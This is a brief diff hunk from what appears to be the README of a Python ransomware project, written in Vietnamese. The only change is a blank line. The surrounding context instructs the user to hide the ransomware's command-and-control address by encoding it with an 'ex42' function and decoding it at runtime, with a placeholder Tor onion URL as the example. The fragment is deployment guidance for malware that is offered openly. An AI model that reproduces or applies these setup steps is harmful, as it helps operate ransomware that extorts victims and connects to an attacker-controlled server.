@@ -13,6 +13,7 @@ Ransomware viết bằng Python 💀💀💀
   YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode()
   ```
   (Trước đó dùng hàm `ex42` từ module `edx42` để mã hóa URL.)
+  
   Ví dụ:
   ```python
   encoded_url = ex42(b"https://your-tor-server.onion")
